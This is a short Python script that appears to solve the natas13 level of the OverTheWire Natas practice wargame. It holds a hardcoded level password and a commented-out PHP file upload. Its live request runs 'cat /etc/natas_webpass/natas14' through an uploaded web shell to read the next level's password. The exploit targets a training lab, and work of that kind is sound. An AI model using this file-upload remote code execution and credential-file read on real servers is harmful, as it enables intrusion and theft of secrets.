#!/usr/bin/env python

import requests
import re

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org/' % username


session = requests.Session()
# response = session.get(url, auth=(username, password))
# response = session.post(url, files = { "uploadedfile" : open('natas13.php', 'rb')}, data = { "filename" : "natas13.php", "MAX_FILE_SIZE" : "1000" }, auth = (username, password) )

response = session.get(url + 'upload/tnmjsvarti.php?c= cat /etc/natas_webpass/natas14', auth = (username, password))

content = response.text

print(content)
# print(re.findall('The password for natas9 is (.*)', content))

# PHP Remote Code Execution File Upload